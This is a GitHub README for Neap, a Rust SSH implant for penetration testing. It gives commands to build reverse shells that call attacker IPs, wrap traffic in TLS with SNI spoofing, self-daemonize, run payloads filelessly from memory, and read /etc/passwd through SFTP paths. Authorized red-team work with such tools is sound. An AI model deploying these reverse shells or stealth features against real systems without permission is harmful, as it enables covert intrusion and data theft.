<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-light.svg">
  <img alt="Neap" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Rust](https://img.shields.io/badge/language-Rust-orange.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-GPLv3-blue.svg)

**Statically-linked SSH server for penetration testing.**

Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, build-time configuration, auto-daemonization, in-memory SFTP, and SFTP shell via `/exec/`.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

**Prerequisites:** Rust 1.75+, Cargo

```bash
git clone https://github.com/Real-Fruit-Snacks/Neap.git
cd Neap
make current
```

**Using build.sh (recommended):**

```bash
./build.sh reverse 192.168.1.10:4444
./build.sh listen 8888
./build.sh reverse 10.10.14.5:443 --tls --password "secret"
```

**Cross-compile for Windows targets (from Linux):**

One-time setup:

```bash
rustup target add x86_64-pc-windows-gnu          # 64-bit
rustup target add i686-pc-windows-gnu            # 32-bit (optional)
sudo apt install mingw-w64                       # Debian/Ubuntu/Kali
# or: sudo dnf install mingw64-gcc mingw32-gcc   # Fedora
```

Build:

```bash
# Windows x64 reverse shell
./build.sh reverse 10.10.14.5:4444 --target x86_64-pc-windows-gnu

# Windows x64 bind shell with TLS
./build.sh listen 4444 --target x86_64-pc-windows-gnu --tls

# Windows x86 reverse shell, NOCLI + UPX-compressed
./build.sh reverse 10.10.14.5:443 \
    --target i686-pc-windows-gnu --nocli --compress
```

The output binary is written to `bin/neap_<host>_<port>.exe`.

**Verify:**

```bash
./neap --help
```

---

## Features

### Reverse Shell

Dial home to attacker with full PTY support. Linux openpty and Windows ConPTY.

```bash
neap 192.168.1.10
neap -p 31337 kali@192.168.1.10
```

### Bind Shell

Listen for incoming SSH connections. Runs in the foreground with logging enabled so you see connections arrive.

```bash
neap -l -p 4444
neap -v -l -p 4444   # extra verbose
```

### SFTP File Transfer

Full SFTP subsystem for file upload and download over the SSH channel.

```bash
sftp -P 4444 user@target
```

### Port Forwarding

Local, remote, and dynamic (SOCKS5) forwarding through the SSH tunnel.

```bash
# Local forward
ssh -L 8080:internal:80 -p 4444 user@target

# Dynamic SOCKS5
ssh -D 1080 -p 4444 user@target
```

### TLS Wrapping

Wrap SSH traffic in TLS with SNI spoofing. Blends with normal HTTPS traffic.

```bash
./build.sh reverse 10.10.14.5:443 --tls
```

### Build-Time Configuration

All connection parameters baked at compile time. No runtime arguments needed on target.

```bash
./build.sh reverse 10.10.14.5:443 --password "s3cret" --tls
# Produces a binary that auto-connects with no flags needed
```

### SFTP Shell (`/exec/`)

Execute commands through any SFTP client — no SSH shell access needed. Access paths under `/exec/` and Neap runs the command, returning output as file content.

```bash
sftp -P 4444 user@target
sftp> get /exec/whoami /dev/stdout
sftp> get "/exec/cat /etc/passwd" /dev/stdout
sftp> get /exec/ipconfig /dev/stdout
```

Works with any standard SFTP client (OpenSSH, WinSCP, FileZilla, scp, curl). No custom tooling required.

**`nexec` helper** — simplified command execution from the attacker side:

```bash
nexec user@target:4444 "whoami"
nexec user@target:4444 "cat /etc/passwd"
```

### Fileless Execution (memfs + /exec/)

Upload a binary via in-memory SFTP, then execute it without touching disk:

```bash
sftp> put payload /tmp/payload
nexec user@target:4444 "/tmp/payload"
```

On Linux, uses `memfd_create()` — the binary runs from RAM via `/proc/self/fd/`. Zero disk artifacts. Windows falls back to a temp file that is deleted immediately after execution.

### Auto-Daemonize

Reverse mode (on target) automatically backgrounds itself — Unix double-fork with full terminal detach, Windows detached process respawn. No visible output on the target.

Bind/listen mode (attacker side) runs in the foreground with logging enabled so you can see connections arrive and get callback info.

### In-Memory SFTP

RAM-only file storage with `--memfs`. Files never touch disk — zero forensic artifacts. All data lost on exit, by design.

```bash
neap --memfs -l -p 4444
./build.sh reverse 10.10.14.5:443 --memfs
```

---

## Architecture

```
src/
├── main.rs          # Entry point, CLI parsing, daemonization
├── config.rs        # Build-time configuration constants
├── daemon.rs        # Auto-daemonize (Unix double-fork / Windows detach)
├── transport.rs     # Bind and reverse mode connection logic, TLS wrapping
├── server.rs        # SSH server handler, authentication, channel dispatch
├── session.rs       # Command execution, environment setup
├── pty/             # PTY handling
│   ├── unix.rs      # Linux openpty
│   └── windows.rs   # Windows ConPTY
├── sftp.rs          # SFTP subsystem (disk-backed)
├── memfs.rs         # In-memory filesystem for memsftp
├── memsftp.rs       # SFTP subsystem (RAM-only, no disk artifacts)
├── exec.rs          # /exec/ SFTP shell — run commands via SFTP paths
├── forwarding.rs    # Local, remote, and dynamic port forwarding
├── info.rs          # System info gathering (reverse mode callback)
└── error.rs         # Error types
```

Two-mode architecture: bind (server listens) or reverse (client dials home). Both share the same SSH session layer with pluggable subsystems for shell, SFTP, and forwarding. TLS wrapping is transparent and optional.

---

## Platform Support

| | Linux | Windows |
|---|---|---|
| Reverse Shell | Full (PTY) | Full (ConPTY) |
| Bind Shell | Full (PTY) | Full (ConPTY) |
| SFTP | Full | Full |
| Port Forwarding | Full | Full |
| TLS Wrapping | Full | Full |
| Auto-Daemonize | Full (double-fork) | Full (detached) |
| In-Memory SFTP | Full | Full |
| SFTP Shell (`/exec/`) | Full | Full |
| Fileless Exec (memfs) | Full (memfd) | Temp file |
| Static Binary | musl | MSVC |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Neap/security/advisories). 90-day responsible disclosure.

**Neap does not:**
- Manage implant networks or tasking (not a C2)
- Generate exploits or payloads (not a framework)
- Destroy evidence or tamper with logs (not anti-forensics)
- Evade EDR behavioral detection (not evasion tooling)

---

## License

[GPLv3](LICENSE) — Copyright 2026 Real-Fruit-Snacks
